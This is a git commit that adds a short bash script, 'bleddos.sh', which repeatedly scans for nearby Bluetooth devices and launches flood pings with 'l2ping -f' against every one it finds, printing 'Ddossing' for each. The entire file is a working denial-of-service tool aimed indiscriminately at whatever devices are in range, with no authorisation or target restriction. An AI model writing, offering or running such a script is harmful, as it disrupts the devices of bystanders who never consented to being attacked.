234608c44b787540bb22672aa0dbdde5d9d831ac
rickyfili10 <riccardofilieri@protonmail.com>
2024-10-11 18:58:07 +0200

    Create bleddos.sh

---
+++ src/bleddos.sh
@@ -0,0 +1,20 @@
+#!/bin/bash
+
+while true; do
+    echo "Scanning..."
+    
+    devices=$(sudo hcitool scan | grep ':' | awk '{print $1}')
+    
+    if [ -z "$devices" ]; then
+        echo "Nothing found :("
+    else
+        echo "Devices found: $devices"
+        
+        for device in $devices; do
+            echo "Ddossing $device"
+            sudo l2ping -f $device &
+        done
+    fi
+    
+    sleep 10
+done
